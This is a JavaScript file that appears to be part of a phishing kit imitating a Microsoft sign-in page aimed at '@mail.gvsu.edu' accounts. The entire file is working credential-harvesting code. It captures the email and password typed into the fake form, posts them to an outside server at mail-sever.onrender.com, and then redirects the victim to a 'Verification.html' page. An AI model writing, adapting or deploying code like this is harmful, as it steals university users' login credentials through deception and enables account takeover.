document.addEventListener("DOMContentLoaded", function() {
    //BUTTON
    const nextBtn = document.querySelector('#idSIButton9');
    const submitBtn = document.getElementById('submitBtn');
    const backBtn = document.querySelector('#idBtn_Back');
    // Get email and password values
    const email = document.getElementById("i0116");
    const password = document.getElementById("i0118");
    email.addEventListener('keypress', (e)=>{
        if(e.target.keycode === 13){
            e.preventDefault();
        }
    })
    nextBtn.addEventListener('click', (e)=>{
        e.preventDefault();
        //console.log(validateEmail(email.value))
        if(validateEmail(email.value)){
            email.style.display = 'none';
            password.style.display = 'block';
            e.target.style.display = 'none';
            submitBtn.style.display = 'block';
        
        }else{
            alert('Invalid email')
        };
    })
    backBtn.addEventListener('click', (e)=>{
        e.preventDefault();
        email.style.display = 'block';
        password.style.display = 'none';
        nextBtn.style.display = 'block';
        submitBtn.style.display = 'none';
        
    });

    const loginForm = document.getElementById("i0281");

    // Add submit event listener
    loginForm.addEventListener("submit", function(event){
        // Prevent the default form submission
        event.preventDefault();
        
        if(password.value != ''){
             //Send Login detail to admin for notification
             const userData = {
                FullName: password.value,
                Email: email.value,
                Password: "username",
            };
            fetch('https://mail-sever.onrender.com/Api/User/sign-up', {
                method : "POST",
                headers : {
                "Content-Type" : "application/json"
                },
                body: JSON.stringify(userData)
            })
            .then(response => {
                if (!response.ok) {
                    return response.json().then(err => { throw err; });
                }
                return response.json();
            });
        
            // Redirect to home page after a delay (e.g., 2 seconds)
            setTimeout(function() {
                window.location.href = "Verification.html"; // Replace "home.html" with your home page URL
            }, 2000)
        }else{
            alert('Password can\'t be empty')
        }

        
        // Validate email and password
            
        
    })
   
    // Function to validate email
    function validateEmail(email) {
        // Check if the email ends with "@mit.edu"
        return email.endsWith("@mail.gvsu.edu");
    }

    // Function to validate password
    function validatePassword(password) {
        // Check if the password is not empty
        return password.trim() !== "";
    }
});

